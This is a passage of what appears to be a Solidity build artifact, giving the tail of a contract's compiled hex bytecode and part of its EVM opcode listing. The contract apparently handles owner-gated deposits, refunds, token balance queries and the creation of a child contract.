fd5b50565b600081359050610eb681610e90565b92915050565b60008060408385031215610ed357610ed2610e23565b5b6000610ee185828601610e71565b9250506020610ef285828601610ea7565b9150509250929050565b60008115159050919050565b610f1181610efc565b82525050565b6000602082019050610f2c6000830184610f08565b92915050565b610f3b81610e86565b82525050565b6000602082019050610f566000830184610f32565b92915050565b600080600060608486031215610f7557610f74610e23565b5b6000610f8386828701610e71565b9350506020610f9486828701610e71565b9250506040610fa586828701610ea7565b9150509250925092565b600060ff82169050919050565b610fc581610faf565b82525050565b6000602082019050610fe06000830184610fbc565b92915050565b600060208284031215610ffc57610ffb610e23565b5b600061100a84828501610e71565b91505092915050565b61101c81610e48565b82525050565b60006020820190506110376000830184611013565b92915050565b6000806040838503121561105457611053610e23565b5b600061106285828601610e71565b925050602061107385828601610e71565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806110c457607f821691505b6020821081036110d7576110d661107d565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061111782610e86565b915061112283610e86565b925082820261113081610e86565b91508282048414831517611147576111466110dd565b5b5092915050565b60006060820190506111636000830186611013565b6111706020830185610f32565b61117d6040830184610f32565b949350505050565b600061119082610e86565b915061119b83610e86565b92508282019050808211156111b3576111b26110dd565b5b9291505056fea2646970667358221220da64986efe334ff5837b986db8a789595ef8a676806085e4ac809b5c5513312f64736f6c63430008150033a2646970667358221220de443dbd1f17109cd48bca501102b159e77824c1b5a3660b39a879017ba4a2b964736f6c63430008150033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH3 0x133 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7DED653F GT PUSH3 0xAF JUMPI DUP1 PUSH4 0xCA77AB65 GT PUSH3 0x6D JUMPI DUP1 PUSH4 0xCA77AB65 EQ PUSH3 0x40A JUMPI DUP1 PUSH4 0xDF385306 EQ PUSH3 0x424 JUMPI DUP1 PUSH4 0xE4655BCA EQ PUSH3 0x454 JUMPI DUP1 PUSH4 0xE47112BD EQ PUSH3 0x484 JUMPI DUP1 PUSH4 0xFE67A54B EQ PUSH3 0x49E JUMPI PUSH3 0x13B JUMP JUMPDEST DUP1 PUSH4 0x7DED653F EQ PUSH3 0x308 JUMPI DUP1 PUSH4 0x83634E1C EQ PUSH3 0x338 JUMPI DUP1 PUSH4 0xA45B4ABB EQ PUSH3 0x37C JUMPI DUP1 PUSH4 0xAA9D9BD6 EQ PUSH3 0x3C0 JUMPI DUP1 PUSH4 0xAC5ECE6D EQ PUSH3 0x3DA JUMPI PUSH3 0x13B JUMP JUMPDEST DUP1 PUSH4 0x1F732088 GT PUSH3 0xFD JUMPI DUP1 PUSH4 0x1F732088 EQ PUSH3 0x1E7 JUMPI DUP1 PUSH4 0x1F8CDB04 EQ PUSH3 0x22B JUMPI DUP1 PUSH4 0x2D21A3ED EQ PUSH3 0x237 JUMPI DUP1 PUSH4 0x3FA8578D EQ PUSH3 0x27B JUMPI DUP1 PUSH4 0x4FEE13FC EQ PUSH3 0x2C4 JUMPI PUSH3 0x13B JUMP JUMPDEST DUP1 PUSH4 0x8BFC300 EQ PUSH3 0x13D JUMPI DUP1 PUSH4 0xB324808 EQ PUSH3 0x16D JUMPI DUP1 PUSH4 0x12210E8A EQ PUSH3 0x19D JUMPI DUP1 PUSH4 0x14DF33AC EQ PUSH3 0x1B7 JUMPI PUSH3 0x13B JUMP JUMPDEST CALLDATASIZE PUSH3 0x13B JUMPI STOP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x155 PUSH3 0x4B8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x164 SWAP2 SWAP1 PUSH3 0x1C0B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x17A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x185 PUSH3 0x4CF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x194 SWAP2 SWAP1 PUSH3 0x1C43 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x1AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x1B5 PUSH3 0x4D8 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x1C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x1CF PUSH3 0x69B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x1DE SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x1F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x213 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x20D SWAP2 SWAP1 PUSH3 0x1CCE JUMP JUMPDEST PUSH3 0x749 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x222 SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH3 0x235 PUSH3 0x7EF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x263 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x25D SWAP2 SWAP1 PUSH3 0x1CCE JUMP JUMPDEST PUSH3 0xBDC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x288 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x2A7 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x2A1 SWAP2 SWAP1 PUSH3 0x1CCE JUMP JUMPDEST PUSH3 0xCBC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x2BB SWAP7 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x1D62 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x2D1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x2F0 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x2EA SWAP2 SWAP1 PUSH3 0x1DCF JUMP JUMPDEST PUSH3 0xD25 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x2FF SWAP2 SWAP1 PUSH3 0x1E16 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x315 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x320 PUSH3 0x1004 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x32F SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x345 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x364 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x35E SWAP2 SWAP1 PUSH3 0x1CCE JUMP JUMPDEST PUSH3 0x1092 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x373 SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x389 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x3A8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH3 0x3A2 SWAP2 SWAP1 PUSH3 0x1CCE JUMP JUMPDEST PUSH3 0x1138 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x3B7 SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x3CD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x3D8 PUSH3 0x11DE JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x3E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x3F2 PUSH3 0x1304 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x401 SWAP2 SWAP1 PUSH3 0x1E16 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x417 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x422 PUSH3 0x132C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x431 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x43C PUSH3 0x164D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x44B SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x461 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x46C PUSH3 0x16DD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH3 0x47B SWAP2 SWAP1 PUSH3 0x1C7B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x49C PUSH3 0x176D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH3 0x4AB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x4B6 PUSH3 0x1A4C JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 JUMPDEST PUSH1 0x1 SLOAD DUP2 LT ISZERO PUSH3 0x698 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD GT DUP1 ISZERO PUSH3 0x522 JUMPI POP PUSH1 0x8 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD SELFBALANCE GT JUMPDEST DUP1 ISZERO PUSH3 0x52F JUMPI POP PUSH1 0x0 SELFBALANCE GT JUMPDEST ISZERO PUSH3 0x682 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD SWAP1 POP PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH3 0x5AE SWAP1 PUSH3 0x1E68 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH3 0x5ED JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH3 0x5F2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP PUSH32 0xB24B09FD2E8E4D8904C3C26F3E935824E032891520FFDA419DEC9F086B0E1EEA PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x8 PUSH1 0x0 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD DUP5 PUSH1 0x40 MLOAD PUSH3 0x677 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x1E7F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMPDEST DUP1 DUP1 PUSH3 0x68F SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 POP POP PUSH3 0x4DB JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x723 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x7D1 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x875 JUMPI PUSH1 0x40 MLOAD PUSH32 0xC3FDC7C100000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x9 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x1 DUP2 GT ISZERO PUSH3 0x89A JUMPI PUSH3 0x899 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP1 DUP2 GT ISZERO PUSH3 0x8B0 JUMPI PUSH3 0x8AF PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST SUB PUSH3 0x8E8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x5DE7A96600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 CALLVALUE GT PUSH3 0x92E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x925 SWAP1 PUSH3 0x1F99 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH3 0x938 PUSH3 0x132C JUMP JUMPDEST PUSH2 0x4B0 PUSH1 0x3 SLOAD TIMESTAMP PUSH3 0x94B SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST LT PUSH3 0x98E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x985 SWAP1 PUSH3 0x2046 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x4 SLOAD GT PUSH3 0x9D6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x9CD SWAP1 PUSH3 0x20B8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 PUSH1 0x1 SLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SWAP1 POP PUSH1 0x1 SLOAD DUP2 PUSH1 0x0 ADD DUP2 SWAP1 SSTORE POP CALLER DUP2 PUSH1 0x1 ADD PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP2 PUSH1 0x2 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x1 DUP2 PUSH1 0x5 ADD PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP2 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP2 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP DUP1 PUSH1 0x8 PUSH1 0x0 PUSH1 0x1 SLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 ADD SLOAD DUP2 PUSH1 0x0 ADD SSTORE PUSH1 0x1 DUP3 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0x1 ADD PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x2 DUP3 ADD SLOAD DUP2 PUSH1 0x2 ADD SSTORE PUSH1 0x3 DUP3 ADD SLOAD DUP2 PUSH1 0x3 ADD SSTORE PUSH1 0x4 DUP3 ADD SLOAD DUP2 PUSH1 0x4 ADD SSTORE PUSH1 0x5 DUP3 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 PUSH1 0x5 ADD PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP SWAP1 POP POP PUSH32 0x6559452B5CF88E12990371C9441273D2DBB464FB7DD9CC4030551B86DF924B62 DUP2 PUSH1 0x0 ADD SLOAD DUP3 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x2 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0xBAD SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x20DA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH3 0xBCA SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH3 0xBD9 PUSH3 0x132C JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0xC71 SWAP2 SWAP1 PUSH3 0x1E16 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0xC8F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0xCB5 SWAP2 SWAP1 PUSH3 0x212E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP DUP1 PUSH1 0x0 ADD SLOAD SWAP1 DUP1 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP1 PUSH1 0x2 ADD SLOAD SWAP1 DUP1 PUSH1 0x3 ADD SLOAD SWAP1 DUP1 PUSH1 0x4 ADD SLOAD SWAP1 DUP1 PUSH1 0x5 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP DUP7 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0xDAD JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x9 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xDD2 JUMPI PUSH3 0xDD1 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xDE9 JUMPI PUSH3 0xDE8 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST SUB PUSH3 0xE21 JUMPI PUSH1 0x40 MLOAD PUSH32 0x6668065E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xE4A JUMPI PUSH3 0xE49 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP DUP3 PUSH1 0x2 DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x5 DUP2 SWAP1 SSTORE POP PUSH32 0x0 PUSH1 0x0 DUP2 SWAP1 SSTORE POP DUP3 PUSH1 0x4 DUP2 SWAP1 SSTORE POP TIMESTAMP PUSH1 0x3 DUP2 SWAP1 SSTORE POP PUSH1 0x2 SLOAD ADDRESS PUSH1 0x40 MLOAD PUSH3 0xEA4 SWAP1 PUSH3 0x1B7D JUMP JUMPDEST PUSH3 0xEB1 SWAP3 SWAP2 SWAP1 PUSH3 0x2160 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH3 0xECE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x6 PUSH1 0x1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x7 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH32 0xF0EB7CC9CDE5623ECDC8F18C7FE6BACAB47AB80468F73B4D9B3D08EC7284AF5 PUSH1 0x3 SLOAD PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 SLOAD PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH3 0xFD1 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x218D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER 